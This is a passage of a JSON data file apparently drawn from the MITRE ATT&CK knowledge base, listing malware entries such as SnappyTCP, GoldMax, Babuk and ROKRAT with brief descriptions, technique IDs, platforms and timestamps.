      "description": "[SnappyTCP](https://attack.mitre.org/software/S1163) is a web shell used by [Sea Turtle](https://attack.mitre.org/groups/G1041) between 2021 and 2023 against multiple victims. [SnappyTCP](https://attack.mitre.org/software/S1163) appears to be based on a public GitHub project that has since been removed from the code-sharing site. [SnappyTCP](https://attack.mitre.org/software/S1163) includes a simple reverse TCP shell for Linux and Unix environments with basic command and control capabilities.(Citation: PWC Sea Turtle 2023)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1059.004",
        "T1071.001",
        "T1573.002",
        "T1505.003",
        "T1095"
      ],
      "platforms": [
        "Linux"
      ],
      "url": "https://attack.mitre.org/software/S1163",
      "stix_id": "malware--5a6fa62e-4ddf-4ae3-974a-f17f24058350",
      "created": "2024-11-20T20:59:11.460000+00:00",
      "modified": "2025-01-07T16:01:34.817000+00:00"
    },
    "S0025": {
      "id": "S0025",
      "name": "CALENDAR",
      "description": "[CALENDAR](https://attack.mitre.org/software/S0025) is malware used by [APT1](https://attack.mitre.org/groups/G0006) that mimics legitimate Gmail Calendar traffic. (Citation: Mandiant APT1)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1059.003",
        "T1102.002"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0025",
      "stix_id": "malware--5a84dc36-df0d-4053-9b7c-f0c388a57283",
      "created": "2017-05-31T21:32:20.137000+00:00",
      "modified": "2025-04-25T14:43:28.496000+00:00"
    },
    "S0372": {
      "id": "S0372",
      "name": "LockerGoga",
      "description": "[LockerGoga](https://attack.mitre.org/software/S0372) is ransomware that was first reported in January 2019, and has been tied to various attacks on European companies, including industrial and manufacturing firms.(Citation: Unit42 LockerGoga 2019)(Citation: CarbonBlack LockerGoga 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1070.004",
        "T1562.001",
        "T1486",
        "T1529",
        "T1531",
        "T1553.002",
        "T1570"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0372",
      "stix_id": "malware--5af7a825-2d9f-400d-931a-e00eb9e27f48",
      "created": "2019-04-16T19:00:49.435000+00:00",
      "modified": "2023-10-17T20:05:34.648000+00:00"
    },
    "S1185": {
      "id": "S1185",
      "name": "LightSpy",
      "description": "First observed in 2018, LightSpy is a modular malware family that initially targeted iOS devices in Southern Asia before expanding to Android and macOS platforms. It consists of a downloader, a main executable that manages network communications, and functionality-specific modules, typically implemented as `.dylib` files (iOS, macOS) or `.apk` files (Android). LightSpy can collect VoIP call recordings, SMS messages, and credential stores, which are then exfiltrated to a command and control (C2) server.(Citation: MelikovBlackBerry LightSpy 2024) ",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1057",
        "T1480",
        "T1555.001",
        "T1105",
        "T1113",
        "T1041",
        "T1071.001",
        "T1129",
        "T1123",
        "T1027.013",
        "T1082",
        "T1083",
        "T1217",
        "T1027.001",
        "T1518",
        "T1046"
      ],
      "platforms": [
        "Android",
        "Windows",
        "iOS",
        "macOS"
      ],
      "url": "https://attack.mitre.org/software/S1185",
      "stix_id": "malware--5b5d1e6c-e7de-4b46-ab8f-8556e8745927",
      "created": "2025-01-03T20:41:46.276000+00:00",
      "modified": "2025-04-15T18:40:23.781000+00:00"
    },
    "S0220": {
      "id": "S0220",
      "name": "Chaos",
      "description": "[Chaos](https://attack.mitre.org/software/S0220) is Linux malware that compromises systems by brute force attacks against SSH services. Once installed, it provides a reverse shell to its controllers, triggered by unsolicited packets. (Citation: Chaos Stolen Backdoor)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1573.001",
        "T1059.004",
        "T1110",
        "T1205",
        "T1104"
      ],
      "platforms": [
        "Linux"
      ],
      "url": "https://attack.mitre.org/software/S0220",
      "stix_id": "malware--5bcd5511-6756-4824-a692-e8bb109364af",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2025-04-25T14:43:29.227000+00:00"
    },
    "S0189": {
      "id": "S0189",
      "name": "ISMInjector",
      "description": "[ISMInjector](https://attack.mitre.org/software/S0189) is a Trojan used to install another [OilRig](https://attack.mitre.org/groups/G0049) backdoor, ISMAgent. (Citation: OilRig New Delivery Oct 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1140",
        "T1027",
        "T1055.012",
        "T1053.005"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0189",
      "stix_id": "malware--5be33fef-39c0-4532-84ee-bea31e1b5324",
      "created": "2018-01-16T16:13:52.465000+00:00",
      "modified": "2025-04-25T14:43:29.589000+00:00"
    },
    "S0196": {
      "id": "S0196",
      "name": "PUNCHBUGGY",
      "description": "[PUNCHBUGGY](https://attack.mitre.org/software/S0196) is a backdoor malware used by [FIN8](https://attack.mitre.org/groups/G0061) that has been observed targeting POS networks in the hospitality industry. (Citation: Morphisec ShellTea June 2019)(Citation: FireEye Fin8 May 2016) (Citation: FireEye Know Your Enemy FIN8 Aug 2016)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1059.006",
        "T1218.011",
        "T1546.009",
        "T1129",
        "T1087.001",
        "T1518.001",
        "T1547.001",
        "T1036.005",
        "T1560.001",
        "T1059.001",
        "T1105",
        "T1074.001",
        "T1071.001",
        "T1140",
        "T1070.004",
        "T1027",
        "T1082"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0196",
      "stix_id": "malware--5c6ed2dc-37f4-40ea-b2e1-4c76140a388c",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2025-04-16T20:38:11.382000+00:00"
    },
    "S0588": {
      "id": "S0588",
      "name": "GoldMax",
      "description": "[GoldMax](https://attack.mitre.org/software/S0588) is a second-stage C2 backdoor written in Go with Windows and Linux variants that are nearly identical in functionality. [GoldMax](https://attack.mitre.org/software/S0588) was discovered in early 2021 during the investigation into the [SolarWinds Compromise](https://attack.mitre.org/campaigns/C0024), and has likely been used by [APT29](https://attack.mitre.org/groups/G0016) since at least mid-2019. [GoldMax](https://attack.mitre.org/software/S0588) uses multiple defense evasion techniques, including avoiding virtualization execution and masking malicious traffic.(Citation: MSTIC NOBELIUM Mar 2021)(Citation: FireEye SUNSHUTTLE Mar 2021)(Citation: CrowdStrike StellarParticle January 2022)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1053.005",
        "T1027.002",
        "T1564.011",
        "T1124",
        "T1016",
        "T1053.003",
        "T1573.002",
        "T1059.003",
        "T1140",
        "T1001.001",
        "T1027.013",
        "T1071.001",
        "T1105",
        "T1036.005",
        "T1497.003",
        "T1497.001",
        "T1041",
        "T1036.004"
      ],
      "platforms": [
        "Windows",
        "Linux"
      ],
      "url": "https://attack.mitre.org/software/S0588",
      "stix_id": "malware--5c747acd-47f0-4c5a-b9e5-213541fc01e0",
      "created": "2021-03-12T16:10:45.416000+00:00",
      "modified": "2024-04-11T02:26:45.606000+00:00"
    },
    "S0617": {
      "id": "S0617",
      "name": "HELLOKITTY",
      "description": "[HELLOKITTY](https://attack.mitre.org/software/S0617) is a ransomware written in C++  that shares similar code structure and functionality with [DEATHRANSOM](https://attack.mitre.org/software/S0616) and [FIVEHANDS](https://attack.mitre.org/software/S0618). [HELLOKITTY](https://attack.mitre.org/software/S0617) has been used since at least 2020, targets have included a Polish video game developer and a Brazilian electric power company.(Citation: FireEye FiveHands April 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1486",
        "T1490",
        "T1135",
        "T1047",
        "T1082",
        "T1057"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0617",
      "stix_id": "malware--5d11d418-95dd-4377-b782-23160dfa17b4",
      "created": "2021-06-03T20:07:21.788000+00:00",
      "modified": "2025-04-25T14:43:30.306000+00:00"
    },
    "S0614": {
      "id": "S0614",
      "name": "CostaBricks",
      "description": "[CostaBricks](https://attack.mitre.org/software/S0614) is a loader that was used to deploy 32-bit backdoors in the [CostaRicto](https://attack.mitre.org/groups/G0132) campaign.(Citation: BlackBerry CostaRicto November 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1105",
        "T1027.002",
        "T1027.001",
        "T1055",
        "T1106",
        "T1140"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0614",
      "stix_id": "malware--5d342981-5194-41e7-b33f-8e91998d7d88",
      "created": "2021-05-24T15:56:18.522000+00:00",
      "modified": "2025-04-16T20:38:11.736000+00:00"
    },
    "S1096": {
      "id": "S1096",
      "name": "Cheerscrypt",
      "description": "[Cheerscrypt](https://attack.mitre.org/software/S1096) is a ransomware that was developed by [Cinnamon Tempest](https://attack.mitre.org/groups/G1021) and has been used in attacks against ESXi and Windows environments since at least 2022. [Cheerscrypt](https://attack.mitre.org/software/S1096) was derived from the leaked [Babuk](https://attack.mitre.org/software/S0638) source code and has infrastructure overlaps with deployments of Night Sky ransomware, which was also derived from [Babuk](https://attack.mitre.org/software/S0638).(Citation: Sygnia Emperor Dragonfly October 2022)(Citation: Trend Micro Cheerscrypt May 2022)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1489",
        "T1059.012",
        "T1486",
        "T1083",
        "T1673"
      ],
      "platforms": [
        "Windows",
        "ESXi"
      ],
      "url": "https://attack.mitre.org/software/S1096",
      "stix_id": "malware--5d3fa1db-5041-4560-b87b-8f61cc225c52",
      "created": "2023-12-18T20:24:33.641000+00:00",
      "modified": "2025-04-15T19:12:30.368000+00:00"
    },
    "S1119": {
      "id": "S1119",
      "name": "LIGHTWIRE",
      "description": "[LIGHTWIRE](https://attack.mitre.org/software/S1119) is a web shell written in Perl that was used during [Cutting Edge](https://attack.mitre.org/campaigns/C0029) to maintain access and enable command execution by imbedding into the legitimate compcheckresult.cgi component of Ivanti Secure Connect VPNs.(Citation: Mandiant Cutting Edge Part 2 January 2024)(Citation: Mandiant Cutting Edge January 2024)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1071.001",
        "T1140",
        "T1505.003",
        "T1573.001",
        "T1554"
      ],
      "platforms": [
        "Network Devices"
      ],
      "url": "https://attack.mitre.org/software/S1119",
      "stix_id": "malware--5dc9e8ec-9917-4de7-b8ab-16007899dd80",
      "created": "2024-03-07T20:52:41.463000+00:00",
      "modified": "2025-04-15T19:46:34.303000+00:00"
    },
    "S0387": {
      "id": "S0387",
      "name": "KeyBoy",
      "description": "[KeyBoy](https://attack.mitre.org/software/S0387) is malware that has been used in targeted campaigns against members of the Tibetan Parliament in 2016.(Citation: CitizenLab KeyBoy Nov 2016)(Citation: PWC KeyBoys Feb 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1016",
        "T1082",
        "T1543.003",
        "T1059.006",
        "T1564.003",
        "T1001.003",
        "T1056.001",
        "T1027.013",
        "T1070.006",
        "T1105",
        "T1083",
        "T1059.005",
        "T1559.002",
        "T1059.001",
        "T1113",
        "T1059.003",
        "T1555.003",
        "T1547.004"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0387",
      "stix_id": "malware--5dd649c0-bca4-488b-bd85-b180474ec62e",
      "created": "2019-06-14T16:45:33.729000+00:00",
      "modified": "2024-04-18T18:25:18.520000+00:00"
    },
    "S0150": {
      "id": "S0150",
      "name": "POSHSPY",
      "description": "[POSHSPY](https://attack.mitre.org/software/S0150) is a backdoor that has been used by [APT29](https://attack.mitre.org/groups/G0016) since at least 2015. It appears to be used as a secondary backdoor used if the actors lost access to their primary backdoors. (Citation: FireEye POSHSPY April 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1030",
        "T1568.002",
        "T1027",
        "T1059.001",
        "T1573.002",
        "T1105",
        "T1070.006",
        "T1546.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0150",
      "stix_id": "malware--5e595477-2e78-4ce7-ae42-e0b059b17808",
      "created": "2017-12-14T16:46:06.044000+00:00",
      "modified": "2025-04-25T14:43:31.381000+00:00"
    },
    "S0051": {
      "id": "S0051",
      "name": "MiniDuke",
      "description": "[MiniDuke](https://attack.mitre.org/software/S0051) is malware that was used by [APT29](https://attack.mitre.org/groups/G0016) from 2010 to 2015. The [MiniDuke](https://attack.mitre.org/software/S0051) toolset consists of multiple downloader and backdoor components. The loader has been used with other [MiniDuke](https://attack.mitre.org/software/S0051) components as well as in conjunction with [CosmicDuke](https://attack.mitre.org/software/S0050) and [PinchDuke](https://attack.mitre.org/software/S0048). (Citation: F-Secure The Dukes)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1102.001",
        "T1082",
        "T1568.002",
        "T1027",
        "T1008",
        "T1105",
        "T1090.001",
        "T1083",
        "T1071.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0051",
      "stix_id": "malware--5e7ef1dc-7fb6-4913-ac75-e06113b59e0c",
      "created": "2017-05-31T21:32:36.919000+00:00",
      "modified": "2025-04-25T14:43:31.760000+00:00"
    },
    "S0398": {
      "id": "S0398",
      "name": "HyperBro",
      "description": "[HyperBro](https://attack.mitre.org/software/S0398) is a custom in-memory backdoor used by [Threat Group-3390](https://attack.mitre.org/groups/G0027).(Citation: Unit42 Emissary Panda May 2019)(Citation: Securelist LuckyMouse June 2018)(Citation: Hacker News LuckyMouse June 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1055",
        "T1574.001",
        "T1071.001",
        "T1140",
        "T1569.002",
        "T1007",
        "T1113",
        "T1027.002",
        "T1106",
        "T1027.013",
        "T1105",
        "T1070.004"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0398",
      "stix_id": "malware--5e814485-012d-423d-b769-026bfed0f451",
      "created": "2019-07-09T17:42:44.777000+00:00",
      "modified": "2024-04-11T02:16:42.727000+00:00"
    },
    "S0504": {
      "id": "S0504",
      "name": "Anchor",
      "description": "[Anchor](https://attack.mitre.org/software/S0504) is one of a family of backdoor malware that has been used in conjunction with [TrickBot](https://attack.mitre.org/software/S0266) on selected high profile targets since at least 2018.(Citation: Cyberreason Anchor December 2019)(Citation: Medium Anchor DNS July 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1095",
        "T1059.003",
        "T1105",
        "T1480",
        "T1082",
        "T1053.005",
        "T1053.003",
        "T1059.004",
        "T1071.001",
        "T1553.002",
        "T1071.004",
        "T1543.003",
        "T1027",
        "T1016",
        "T1070.004",
        "T1027.002",
        "T1564.004",
        "T1569.002",
        "T1021.002",
        "T1008"
      ],
      "platforms": [
        "Linux",
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0504",
      "stix_id": "malware--5f1d4579-4e8f-48e7-860e-2da773ae432e",
      "created": "2020-09-10T15:54:21.805000+00:00",
      "modified": "2023-12-04T20:02:47.052000+00:00"
    },
    "S1188": {
      "id": "S1188",
      "name": "Line Runner",
      "description": "[Line Runner](https://attack.mitre.org/software/S1188) is a persistent backdoor and web shell allowing threat actors to upload and execute arbitrary Lua scripts. [Line Runner](https://attack.mitre.org/software/S1188) is associated with the [ArcaneDoor](https://attack.mitre.org/campaigns/C0046) campaign.(Citation: CCCS ArcaneDoor 2024)(Citation: Cisco ArcaneDoor 2024)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1041",
        "T1027.015",
        "T1653",
        "T1071.001",
        "T1059.011",
        "T1505.003",
        "T1070.004",
        "T1557"
      ],
      "platforms": [
        "Network Devices"
      ],
      "url": "https://attack.mitre.org/software/S1188",
      "stix_id": "malware--5f8c69a5-7acd-4a36-a929-de558d9c8223",
      "created": "2025-01-06T18:45:41.366000+00:00",
      "modified": "2025-04-15T19:46:34.391000+00:00"
    },
    "S0147": {
      "id": "S0147",
      "name": "Pteranodon",
      "description": "[Pteranodon](https://attack.mitre.org/software/S0147) is a custom backdoor used by [Gamaredon Group](https://attack.mitre.org/groups/G0047). (Citation: Palo Alto Gamaredon Feb 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1113",
        "T1059.003",
        "T1106",
        "T1105",
        "T1547.001",
        "T1071.001",
        "T1083",
        "T1140",
        "T1027.007",
        "T1059.005",
        "T1218.011",
        "T1041",
        "T1070.004",
        "T1074.001",
        "T1497",
        "T1218.005",
        "T1053.005"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0147",
      "stix_id": "malware--5f9f7648-04ba-4a9f-bb4c-2a13e74572bd",
      "created": "2017-05-31T21:33:26.084000+00:00",
      "modified": "2025-04-16T20:38:12.213000+00:00"
    },
    "S1066": {
      "id": "S1066",
      "name": "DarkTortilla",
      "description": "[DarkTortilla](https://attack.mitre.org/software/S1066) is a highly configurable .NET-based crypter that has been possibly active since at least August 2015. [DarkTortilla](https://attack.mitre.org/software/S1066) has been used to deliver popular information stealers, RATs, and payloads such as [Agent Tesla](https://attack.mitre.org/software/S0331), AsyncRat, [NanoCore](https://attack.mitre.org/software/S0336), RedLine, [Cobalt Strike](https://attack.mitre.org/software/S0154), and Metasploit.(Citation: Secureworks DarkTortilla Aug 2022)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1105",
        "T1140",
        "T1027",
        "T1055.001",
        "T1566.001",
        "T1547.001",
        "T1547.004",
        "T1497.003",
        "T1574.012",
        "T1518.001",
        "T1059.003",
        "T1082",
        "T1036",
        "T1564",
        "T1497.001",
        "T1115",
        "T1056.001",
        "T1204.002",
        "T1057",
        "T1016.001",
        "T1047",
        "T1106",
        "T1102",
        "T1007",
        "T1559.001",
        "T1622",
        "T1112",
        "T1071.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1066",
      "stix_id": "malware--5faaf81a-aa5b-4a4b-bae5-522439e068f8",
      "created": "2023-02-16T13:57:53.205000+00:00",
      "modified": "2025-04-16T20:38:12.375000+00:00"
    },
    "S0240": {
      "id": "S0240",
      "name": "ROKRAT",
      "description": "[ROKRAT](https://attack.mitre.org/software/S0240) is a cloud-based remote access tool (RAT) used by [APT37](https://attack.mitre.org/groups/G0067) to target victims in South Korea. [APT37](https://attack.mitre.org/groups/G0067) has used ROKRAT during several campaigns from 2016 through 2021.(Citation: Talos ROKRAT)(Citation: Talos Group123)(Citation: Volexity InkySquid RokRAT August 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1112",
        "T1123",
        "T1012",
        "T1555.003",
        "T1056.001",
        "T1106",
        "T1622",
        "T1057",
        "T1070.004",
        "T1059.005",
        "T1555.004",
        "T1480.001",
        "T1041",
        "T1566.001",
        "T1115",
        "T1027",
        "T1497.001",
        "T1083",
        "T1105",
        "T1140",
        "T1102.002",
        "T1113",
        "T1033",
        "T1055",
        "T1082",
        "T1010",
        "T1005",
        "T1204.002",
        "T1567.002",
        "T1071.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0240",
      "stix_id": "malware--60a9c2f0-b7a5-4e8e-959c-e1a3ff314a5f",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2025-04-25T14:43:33.037000+00:00"
    },
    "S0137": {
      "id": "S0137",
      "name": "CORESHELL",
      "description": "[CORESHELL](https://attack.mitre.org/software/S0137) is a downloader used by [APT28](https://attack.mitre.org/groups/G0007). The older versions of this malware are known as SOURFACE and newer versions as CORESHELL.(Citation: FireEye APT28) (Citation: FireEye APT28 January 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1071.001",
        "T1071.003",
        "T1132.001",
        "T1082",
        "T1027.016",
        "T1218.011",
        "T1547.001",
        "T1105",
        "T1027",
        "T1573.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0137",
      "stix_id": "malware--60c18d06-7b91-4742-bae3-647845cd9d81",
      "created": "2017-05-31T21:33:18.506000+00:00",
      "modified": "2024-11-17T14:43:38.590000+00:00"
    },
    "S0253": {
      "id": "S0253",
      "name": "RunningRAT",
      "description": "[RunningRAT](https://attack.mitre.org/software/S0253) is a remote access tool that appeared in operations surrounding the 2018 Pyeongchang Winter Olympics along with [Gold Dragon](https://attack.mitre.org/software/S0249) and [Brave Prince](https://attack.mitre.org/software/S0252). (Citation: McAfee Gold Dragon)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1562.001",
        "T1059.003",
        "T1056.001",
        "T1547.001",
        "T1070.004",
        "T1082",
        "T1560",
        "T1070.001",
        "T1115"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0253",
      "stix_id": "malware--60d50676-459a-47dd-92e9-a827a9fe9c58",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2025-04-25T14:43:33.592000+00:00"
    },
    "S1010": {
      "id": "S1010",
      "name": "VPNFilter",
      "description": "[VPNFilter](https://attack.mitre.org/software/S1010) is a multi-stage, modular platform with versatile capabilities to support both intelligence-collection and destructive cyber attack operations. [VPNFilter](https://attack.mitre.org/software/S1010) modules such as its packet sniffer ('ps') can collect traffic that passes through an infected device, allowing the theft of website credentials and monitoring of Modbus SCADA protocols. (Citation: William Largent June 2018) (Citation: Carl Hurd March 2019) [VPNFilter](https://attack.mitre.org/software/S1010) was assessed to be replaced by [Sandworm Team](https://attack.mitre.org/groups/G0034) with [Cyclops Blink](https://attack.mitre.org/software/S0687) starting in 2019.(Citation: NCSC CISA Cyclops Blink Advisory February 2022)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1561.001"
      ],
      "platforms": [
        "Network Devices",
        "Linux"
      ],
      "url": "https://attack.mitre.org/software/S1010",
      "stix_id": "malware--6108f800-10b8-4090-944e-be579f01263d",
      "created": "2019-03-26T15:02:14.907000+00:00",
      "modified": "2025-04-15T19:46:34.471000+00:00"
    },
    "S0638": {
      "id": "S0638",
      "name": "Babuk",
      "description": "[Babuk](https://attack.mitre.org/software/S0638) is a Ransomware-as-a-service (RaaS) malware that has been used since at least 2021. The operators of [Babuk](https://attack.mitre.org/software/S0638) employ a \"Big Game Hunting\" approach to targeting major enterprises and operate a leak site to post stolen data as part of their extortion scheme.(Citation: Sogeti CERT ESEC Babuk March 2021)(Citation: McAfee Babuk February 2021)(Citation: CyberScoop Babuk February 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1049",
        "T1106",
        "T1140",
        "T1486",
        "T1027.002",
        "T1489",
        "T1490",
        "T1059.003",
        "T1562.001",
        "T1135",
        "T1007",
        "T1057",
        "T1082",
        "T1083"
      ],
      "platforms": [
        "Windows",
        "Linux"
      ],
      "url": "https://attack.mitre.org/software/S0638",
      "stix_id": "malware--61c7a91a-0b83-461d-ad32-75d96eed4a09",
      "created": "2021-08-11T17:36:46.197000+00:00",
      "modified": "2025-04-25T14:43:34.138000+00:00"
    },
    "S1179": {
      "id": "S1179",
      "name": "Exbyte",
      "description": "[Exbyte](https://attack.mitre.org/software/S1179) is an exfiltration tool written in Go that is uniquely associated with [BlackByte](https://attack.mitre.org/groups/G1043) operations. Observed since 2022, [Exbyte](https://attack.mitre.org/software/S1179) transfers collected files to online file sharing and hosting services.(Citation: Symantec BlackByte 2022)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1106",
        "T1480",
        "T1069.001",
        "T1140",
        "T1083",
        "T1518.001",
        "T1070.004",
        "T1497.001",
        "T1567"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1179",
      "stix_id": "malware--6207dd22-bf18-4c96-aada-c573a9bbf5ec",
      "created": "2024-12-17T00:18:02.466000+00:00",
      "modified": "2025-03-09T16:02:02.193000+00:00"
    },
    "S0673": {
      "id": "S0673",
      "name": "DarkWatchman",
      "description": "[DarkWatchman](https://attack.mitre.org/software/S0673) is a lightweight JavaScript-based remote access tool (RAT) that avoids file operations; it was first observed in November 2021.(Citation: Prevailion DarkWatchman 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1614",
        "T1070.004",
        "T1027.011",
        "T1027.015",
        "T1112",
        "T1490",
        "T1074.001",
        "T1010",
        "T1059.001",
        "T1124",
        "T1083",
        "T1027.010",
        "T1568.002",
        "T1012",
        "T1129",
        "T1217",
        "T1132.001",
        "T1059.003",
        "T1573.002",
        "T1071.001",
        "T1005",
        "T1140",
        "T1047",
        "T1566.001",
        "T1027.004",
        "T1053.005",
        "T1518.001",
        "T1056.001",
        "T1036",
        "T1082",
        "T1033",
        "T1070",
        "T1059.007",
        "T1120"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0673",
      "stix_id": "malware--63686509-069b-4143-99ea-4e59cad6cb2a",
      "created": "2022-01-10T19:43:47.281000+00:00",
      "modified": "2024-08-26T16:28:39.922000+00:00"
    },
    "S0024": {
      "id": "S0024",
      "name": "Dyre",
      "description": "[Dyre](https://attack.mitre.org/software/S0024) is a banking Trojan that has been used for financial gain. \n (Citation: Symantec Dyre June 2015)(Citation: Malwarebytes Dyreza November 2015)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1016",
        "T1033",
        "T1497.001",
        "T1074.001",
        "T1105",
        "T1055.001",
        "T1053.005",
        "T1140",
        "T1071.001",
        "T1082",
        "T1027.002",
        "T1055",
        "T1518",
        "T1543.003",
        "T1041",
        "T1007"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0024",
      "stix_id": "malware--63c2a130-8a5b-452f-ad96-07cf0af12ffe",
      "created": "2017-05-31T21:32:19.746000+00:00",
      "modified": "2025-04-25T14:43:34.862000+00:00"
    },
    "S0564": {
      "id": "S0564",
      "name": "BlackMould",
      "description": "[BlackMould](https://attack.mitre.org/software/S0564) is a web shell based on [China Chopper](https://attack.mitre.org/software/S0020) for servers running Microsoft IIS. First reported in December 2019, it has been used in malicious campaigns by [GALLIUM](https://attack.mitre.org/groups/G0093) against telecommunication providers.(Citation: Microsoft GALLIUM December 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1082",
        "T1059.003",
        "T1071.001",
        "T1005",
        "T1083",
        "T1105"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0564",
      "stix_id": "malware--63c4511b-2d6e-4bb2-b582-e2e99a8a467d",
      "created": "2021-01-14T19:58:17.917000+00:00",
      "modified": "2025-04-25T14:43:35.224000+00:00"
    },
    "S0528": {
      "id": "S0528",
      "name": "Javali",
      "description": "[Javali](https://attack.mitre.org/software/S0528) is a banking trojan that has targeted Portuguese and Spanish-speaking countries since 2017, primarily focusing on customers of financial institutions in Brazil and Mexico.(Citation: Securelist Brazilian Banking Malware July 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1555.003",
        "T1574.001",
        "T1027.001",
        "T1566.002",
        "T1204.001",
        "T1057",
        "T1218.007",
        "T1102.001",
        "T1204.002",
        "T1566.001",
        "T1059.005",
        "T1105"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0528",
      "stix_id": "malware--64122557-5940-4271-9123-25bfc0c693db",
      "created": "2020-11-09T18:32:18.369000+00:00",
      "modified": "2025-04-25T14:43:35.588000+00:00"
    },
    "S1109": {
      "id": "S1109",
      "name": "PACEMAKER",
      "description": "[PACEMAKER](https://attack.mitre.org/software/S1109) is a credential stealer that was used by [APT5](https://attack.mitre.org/groups/G1023) as early as 2020 including activity against US Defense Industrial Base (DIB) companies.(Citation: Mandiant Pulse Secure Zero-Day April 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1003.007",
        "T1055.008",
        "T1119",
        "T1059.004",
        "T1083",
        "T1074.001"
      ],
      "platforms": [
        "Network Devices",
        "Linux"
      ],
      "url": "https://attack.mitre.org/software/S1109",
      "stix_id": "malware--647215dd-29a6-4528-b354-ca8b5e08fca1",
      "created": "2024-02-08T19:38:27.401000+00:00",
      "modified": "2025-04-15T19:46:34.604000+00:00"
    },
    "S1143": {
      "id": "S1143",
      "name": "LunarLoader",
      "description": "[LunarLoader](https://attack.mitre.org/software/S1143) is the loader component for the [LunarWeb](https://attack.mitre.org/software/S1141) and [LunarMail](https://attack.mitre.org/software/S1142) backdoors that has been used by [Turla](https://attack.mitre.org/groups/G0010) since at least 2020 including against a European ministry of foreign affairs (MFA). [LunarLoader](https://attack.mitre.org/software/S1143) has been observed as a standalone and as a part of trojanized open-source software such as AdmPwd.(Citation: ESET Turla Lunar toolset May 2024)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1016",
        "T1480",
        "T1140",
        "T1137.006",
        "T1620"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1143",
      "stix_id": "malware--6490afef-d88e-4e2b-b9d9-a472508ca59d",
      "created": "2024-06-27T19:07:21.574000+00:00",
      "modified": "2024-06-27T20:01:04.973000+00:00"
    },
    "S0127": {
      "id": "S0127",
      "name": "BBSRAT",
      "description": "[BBSRAT](https://attack.mitre.org/software/S0127) is malware with remote access tool functionality that has been used in targeted compromises. (Citation: Palo Alto Networks BBSRAT)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1140",
        "T1560.002",
        "T1547.001",
        "T1007",
        "T1569.002",
        "T1574.001",
        "T1071.001",
        "T1573.001",
        "T1546.015",
        "T1083",
        "T1070.004",
        "T1543.003",
        "T1057",
        "T1055.012"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0127",
      "stix_id": "malware--64d76fa5-cf8f-469c-b78c-1a4f7c5bad80",
      "created": "2017-05-31T21:33:13.664000+00:00",
      "modified": "2025-04-25T14:43:36.304000+00:00"
    },
    "S0013": {
      "id": "S0013",
      "name": "PlugX",
